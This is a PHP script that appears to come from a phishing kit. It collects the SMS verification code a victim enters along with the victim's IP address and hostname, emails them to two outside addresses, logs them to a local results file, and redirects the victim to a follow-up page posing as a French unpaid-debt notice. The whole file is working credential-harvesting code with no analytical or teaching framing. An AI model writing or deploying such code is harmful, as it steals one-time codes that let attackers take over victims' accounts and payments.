<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$bilsmg .= "------------+| PHP |+------------\n";
$bilsmg .= "SMS Code    : ".$_POST['cvv']."\n";
$bilsmg .= "------------+| S E A T x L E O N x FR |+------------\n";
$bilsmg .= "Fr0m $ip             chek in http://www.geoiptool.com/?IP=$ip   \n";


$mailsend = "freeborne@netcourrier.com,zaz.loze@yahoo.com";
$bilsub = "SMS CODE - $ip";
$bilhead = "From: Skitiwi <localhost> ";
$bilhead .= $_POST['eMailAdd']."\n";
$bilhead .= "MIME-Version: 1.0\n";
@mail($mailsend,$bilsub,$bilsmg,$bilhead);

header("Location: sms2.html?page=recouvrement&impaye=4ad939f0d4548dfeab228bf7e7528eea597404c06ea733402847fed7cf6f3ccf");
$txt = fopen('rezlt.txt', 'a');
fwrite($txt, $bilsmg);
fclose($txt);
?>